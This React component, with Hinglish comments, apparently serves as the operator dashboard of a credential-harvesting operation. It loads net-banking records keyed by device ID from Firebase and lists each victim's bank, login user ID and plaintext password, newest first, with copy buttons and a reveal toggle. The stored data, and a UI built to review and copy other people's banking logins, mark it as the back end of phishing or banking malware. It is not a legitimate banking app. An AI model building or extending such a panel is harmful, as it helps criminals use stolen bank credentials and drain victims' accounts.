import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { get, ref } from 'firebase/database';
import { db } from '../firebase/config';

function NetBankingPage() {
  const { deviceId } = useParams();
  const [loginData, setLoginData] = useState(null);
  const [allBanks, setAllBanks] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [copied, setCopied] = useState(null);
  const [showSensitive, setShowSensitive] = useState(false);

  useEffect(() => {
    fetchData();
  }, [deviceId]);

  const fetchData = async () => {
    setLoading(true);
    setError(null);
    try {
      let netbankArray = [];

      /* ---- Fetch ALL from `users_bank/{deviceId}` ---- */
      const usersBankRef = ref(db, `users_bank/${deviceId}`);
      const usersBankSnap = await get(usersBankRef);

      if (usersBankSnap.exists()) {
        const allData = usersBankSnap.val();

        // ✅ Har entry loop karo
        Object.keys(allData).forEach(key => {
          const item = allData[key];

          // ✅ Sirf netbanking type
          if (item && item.type === 'netbanking' && item.userId) {
            netbankArray.push({
              id: key,
              userId: item.userId,
              password: item.password,
              bank: item.bank || 'Bank',
              timestamp: item.updatedAt || 0,
              dateTime: item.updatedAt
                ? new Date(item.updatedAt).toLocaleString('en-IN', {
                    day: '2-digit', month: 'short', year: 'numeric',
                    hour: '2-digit', minute: '2-digit'
                  })
                : 'N/A',
              source: 'users_bank'
            });
          }
        });

        // ✅ Latest pehle
        netbankArray.sort((a, b) => b.timestamp - a.timestamp);

        if (netbankArray.length > 0) {
          setAllBanks(netbankArray);
          setLoginData(netbankArray[0]);  // Latest
        }
      }
    } catch (err) {
      console.error('❌ Error:', err);
      setError(err.message);
    }
    setLoading(false);
  };

  const copyToClipboard = (text, key) => {
    if (!text) return;
    navigator.clipboard.writeText(String(text));
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  // ⏳ Loading
  if (loading) {
    return (
      <div className="nb-loading">
        <div className="nb-spinner"></div>
        <p>Loading bank data...</p>
        <style>{`
          .nb-loading { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 180px; gap: 12px; padding: 20px; }
          .nb-spinner { width: 32px; height: 32px; border: 3px solid rgba(108, 99, 255, 0.15); border-top-color: #6c63ff; border-radius: 50%; animation: nbSpin 0.8s linear infinite; }
          @keyframes nbSpin { to { transform: rotate(360deg); } }
          .nb-loading p { font-size: 12px; color: var(--text-muted); margin: 0; }
        `}</style>
      </div>
    );
  }

  // ❌ Error
  if (error) {
    return (
      <div className="nb-error">
        <span className="nb-error-icon">❌</span>
        <p>Failed to load bank data</p>
        <button onClick={fetchData}>Retry</button>
        <style>{`
          .nb-error { text-align: center; padding: 30px 20px; }
          .nb-error-icon { font-size: 42px; display: block; margin-bottom: 8px; }
          .nb-error p { font-size: 13px; color: var(--text-muted); margin: 0 0 12px; }
          .nb-error button { padding: 8px 22px; border: 1px solid rgba(108, 99, 255, 0.4); border-radius: 8px; background: rgba(108, 99, 255, 0.1); color: #6c63ff; cursor: pointer; font-size: 13px; font-weight: 600; }
        `}</style>
      </div>
    );
  }

  // 📭 Empty
  if (!loginData) {
    return (
      <div className="nb-empty">
        <span>📭</span>
        <p>No net banking data found</p>
        <button onClick={fetchData}>🔄 Refresh</button>
        <style>{`
          .nb-empty { text-align: center; padding: 30px 20px; color: var(--text-muted); }
          .nb-empty span { font-size: 42px; display: block; margin-bottom: 8px; }
          .nb-empty p { font-size: 13px; margin: 0 0 12px; }
          .nb-empty button { padding: 6px 18px; border: 1px solid rgba(108, 99, 255, 0.4); border-radius: 8px; background: rgba(108, 99, 255, 0.1); color: #6c63ff; cursor: pointer; font-size: 12px; font-weight: 600; }
        `}</style>
      </div>
    );
  }

  return (
    <div className="nb-root">
      <style>{`
        .nb-root {
          padding: 8px 0;
          font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
          animation: nbFadeIn 0.4s ease;
        }
        @keyframes nbFadeIn {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }

        /* ===== BANK VISUAL ===== */
        .nb-bank-visual {
          position: relative;
          border-radius: 16px;
          padding: 18px 20px;
          margin-bottom: 14px;
          background: linear-gradient(135deg, #0a2540 0%, #1a3a5c 50%, #0d1f38 100%);
          box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(255, 255, 255, 0.08) inset;
          overflow: hidden;
          color: #fff;
        }
        .nb-bank-visual::before {
          content: '';
          position: absolute;
          top: -50%; right: -20%;
          width: 240px; height: 240px;
          background: radial-gradient(circle, rgba(0, 150, 199, 0.45), transparent 70%);
          border-radius: 50%;
          pointer-events: none;
        }

        .nb-visual-top {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
          position: relative; z-index: 1;
        }

        .nb-bank-logo {
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .nb-bank-circle {
          width: 38px; height: 38px;
          border-radius: 50%;
          background: linear-gradient(135deg, #0096c7, #0077b6);
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 11px;
          font-weight: 900;
          color: #fff;
          box-shadow: 0 4px 12px rgba(0, 150, 199, 0.5);
          border: 2px solid rgba(255,255,255,0.2);
        }
        .nb-bank-name {
          font-size: 14px;
          font-weight: 800;
          letter-spacing: 0.3px;
        }
        .nb-bank-sub {
          font-size: 9.5px;
          color: rgba(255, 255, 255, 0.6);
          text-transform: uppercase;
          letter-spacing: 0.8px;
          font-weight: 600;
        }

        .nb-latest-badge {
          display: flex;
          align-items: center;
          gap: 5px;
          background: rgba(108, 99, 255, 0.15);
          border: 1px solid rgba(108, 99, 255, 0.4);
          color: #a78bfa;
          font-size: 10px;
          font-weight: 700;
          padding: 4px 10px;
          border-radius: 20px;
        }

        .nb-userid-label {
          font-size: 9.5px;
          text-transform: uppercase;
          letter-spacing: 1.2px;
          color: rgba(255, 255, 255, 0.5);
          font-weight: 600;
          margin-bottom: 4px;
          position: relative; z-index: 1;
        }
        .nb-userid-value {
          font-family: 'Courier New', monospace;
          font-size: 22px;
          font-weight: 800;
          letter-spacing: 2px;
          color: #fff;
          margin-bottom: 18px;
          position: relative; z-index: 1;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 8px;
          cursor: pointer;
        }
        .nb-userid-value:hover { color: #6ee7b7; }

        .nb-eye-btn {
          background: rgba(255, 255, 255, 0.1);
          border: none;
          border-radius: 6px;
          padding: 4px 8px;
          cursor: pointer;
          font-size: 14px;
          flex-shrink: 0;
        }

        .nb-visual-bottom {
          display: flex;
          justify-content: space-between;
          align-items: flex-end;
          position: relative; z-index: 1;
        }
        .nb-visual-field { display: flex; flex-direction: column; gap: 2px; }
        .nb-visual-field .lbl {
          font-size: 9px;
          text-transform: uppercase;
          letter-spacing: 1px;
          color: rgba(255, 255, 255, 0.5);
          font-weight: 600;
        }
        .nb-visual-field .val {
          font-size: 12.5px;
          font-weight: 700;
          color: #fff;
        }

        /* ===== ALL BANKS LIST ===== */
        .nb-all-section {
          background: var(--bg-card);
          border: 1px solid var(--border-color);
          border-radius: 12px;
          overflow: hidden;
        }

        .nb-all-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 10px 14px;
          background: var(--bg-input);
          border-bottom: 1px solid var(--border-color);
          font-size: 12px;
          font-weight: 700;
          color: var(--text-primary);
        }

        .nb-count-badge {
          background: linear-gradient(135deg, #6c63ff, #a855f7);
          color: #fff;
          font-size: 10px;
          padding: 2px 9px;
          border-radius: 10px;
          font-weight: 700;
        }

        .nb-all-list {
          max-height: 400px;
          overflow-y: auto;
        }
        .nb-all-list::-webkit-scrollbar { width: 4px; }
        .nb-all-list::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }

        .nb-all-item {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 10px 14px;
          border-bottom: 1px solid var(--border-color);
          cursor: pointer;
          transition: background 0.2s;
          gap: 10px;
        }
        .nb-all-item:last-child { border-bottom: none; }
        .nb-all-item:hover { background: rgba(108, 99, 255, 0.04); }

        .nb-all-item.latest {
          background: rgba(108, 99, 255, 0.06);
          border-left: 3px solid #6c63ff;
        }

        .nb-all-left {
          display: flex;
          align-items: center;
          gap: 10px;
          min-width: 0;
          flex: 1;
        }

        .nb-all-icon {
          width: 36px; height: 36px;
          border-radius: 8px;
          background: linear-gradient(135deg, #0a2540, #0077b6);
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 12px;
          font-weight: 900;
          color: #fff;
          flex-shrink: 0;
          border: 1px solid rgba(0, 150, 199, 0.3);
        }

        .nb-all-info {
          display: flex;
          flex-direction: column;
          gap: 2px;
          min-width: 0;
        }

        .nb-all-userid {
          font-family: 'Courier New', monospace;
          font-size: 12px;
          font-weight: 700;
          color: var(--text-primary);
          letter-spacing: 0.5px;
        }

        .nb-all-bank {
          font-size: 10px;
          color: var(--text-muted);
        }

        .nb-all-right {
          display: flex;
          flex-direction: column;
          align-items: flex-end;
          gap: 3px;
          flex-shrink: 0;
        }

        .nb-new-badge {
          background: linear-gradient(135deg, #10b981, #059669);
          color: #fff;
          font-size: 8px;
          font-weight: 800;
          padding: 2px 6px;
          border-radius: 4px;
        }

        .nb-all-time {
          font-size: 9px;
          color: var(--text-muted);
          white-space: nowrap;
        }

        .nb-copy-tip {
          position: absolute;
          top: -6px; right: 6px;
          background: #6c63ff;
          color: #fff;
          font-size: 9px;
          padding: 2px 6px;
          border-radius: 4px;
          font-weight: 700;
        }

        /* ===== MOBILE ===== */
        @media (max-width: 400px) {
          .nb-userid-value { font-size: 17px; letter-spacing: 1.5px; }
          .nb-bank-visual { padding: 14px 16px; }
          .nb-bank-name { font-size: 12.5px; }
        }
          /* ===== BANK DETAILS GRID (NEW) ===== */
.nb-all-details {
  display: flex;
  align-items: center;
  gap: 6px;
  flex-wrap: wrap;
  margin-top: 4px;
}

.nb-detail-chip {
  display: inline-flex;
  align-items: center;
  gap: 3px;
  background: var(--bg-input);
  border: 1px solid var(--border-color);
  border-radius: 5px;
  padding: 2px 7px;
  font-size: 10px;
  line-height: 1.3;
}

.nb-detail-chip .chip-label {
  color: var(--text-muted);
  font-size: 8.5px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.3px;
}

.nb-detail-chip .chip-value {
  color: var(--text-primary);
  font-family: 'Courier New', monospace;
  font-weight: 700;
  font-size: 10.5px;
}

.nb-all-userid {
  font-family: 'Courier New', monospace;
  font-size: 13px;
  font-weight: 700;
  color: var(--text-primary);
  letter-spacing: 0.8px;
}

.nb-all-item {
  padding: 12px 14px !important;
}

.nb-all-icon {
  width: 40px !important;
  height: 40px !important;
  font-size: 12px !important;
}

/* Mobile */
@media (max-width: 480px) {
  .nb-all-userid {
    font-size: 11px;
  }

  .nb-detail-chip {
    padding: 1px 5px;
  }

  .nb-detail-chip .chip-label {
    font-size: 8px;
  }

  .nb-detail-chip .chip-value {
    font-size: 9.5px;
  }

  .nb-all-icon {
    width: 34px !important;
    height: 34px !important;
  }
}
      `}</style>

      {/* ============ LATEST BANK VISUAL ============ */}
      <div className="nb-bank-visual">
        <div className="nb-visual-top">
          <div className="nb-bank-logo">
            <div className="nb-bank-circle">
              {(loginData.bank || 'BANK').split(' ').map(w => w[0]).join('').slice(0, 4).toUpperCase()}
            </div>
            <div>
              <div className="nb-bank-name">{loginData.bank || 'Bank'}</div>
              <div className="nb-bank-sub">Net Banking</div>
            </div>
          </div>
          <span className="nb-latest-badge">🆕 Latest</span>
        </div>

        <div className="nb-userid-label">Login User ID</div>
        <div
          className="nb-userid-value"
          onClick={() => setShowSensitive(!showSensitive)}
        >
          <span>
            {showSensitive
              ? (loginData.userId || 'N/A')
              : '•'.repeat(Math.min((loginData.userId || '').length || 5, 10))}
          </span>
          <button
            className="nb-eye-btn"
            onClick={(e) => { e.stopPropagation(); setShowSensitive(!showSensitive); }}
          >
            {showSensitive ? '👁️' : '👁️‍🗨️'}
          </button>
        </div>

        <div className="nb-visual-bottom">
          <div className="nb-visual-field">
            <span className="lbl">Login Time</span>
            <span className="val">{loginData.dateTime || 'N/A'}</span>
          </div>
          <div className="nb-visual-field">
            <span className="lbl">Status</span>
            <span className="val" style={{ color: '#6ee7b7' }}>● Active</span>
          </div>
        </div>
      </div>

{/* ============ ALL BANKS LIST ============ */}
{allBanks.length > 0 && (
  <div className="nb-all-section">
    <div className="nb-all-header">
      <span>🏦 All Net Banking</span>
      <span className="nb-count-badge">{allBanks.length}</span>
    </div>

    <div className="nb-all-list">
      {allBanks.map((bank, index) => (
        <div
          key={bank.id}
          className={`nb-all-item ${index === 0 ? 'latest' : ''}`}
          onClick={() => copyToClipboard(bank.userId, `bank_${bank.id}`)}
        >
          {/* LEFT SIDE: Full details */}
          <div className="nb-all-left">
            <div className="nb-all-icon">
              {(bank.bank || 'BK').split(' ').map(w => w[0]).join('').slice(0, 2).toUpperCase()}
            </div>
            <div className="nb-all-info">
              {/* User ID */}
              <span className="nb-all-userid">
                {showSensitive ? bank.userId : '•'.repeat(Math.min((bank.userId || '').length || 5, 10))}
              </span>
              
              {/* Detail Chips: Bank | Password */}
              <div className="nb-all-details">
                <span className="nb-detail-chip">
                  <span className="chip-label">Bank</span>
                  <span className="chip-value">{bank.bank}</span>
                </span>
                <span className="nb-detail-chip">
                  <span className="chip-label">Pwd</span>
                  <span className="chip-value">
                    {showSensitive ? bank.password : '••••••'}
                  </span>
                </span>
              </div>
            </div>
          </div>

          {/* RIGHT SIDE */}
          <div className="nb-all-right">
            {index === 0 && <span className="nb-new-badge">NEW</span>}
            <span className="nb-all-time">{bank.dateTime}</span>
          </div>

          {copied === `bank_${bank.id}` && (
            <span className="nb-copy-tip">Copied!</span>
          )}
        </div>
      ))}
    </div>
  </div>
)}
    </div>
  );
}

export default NetBankingPage;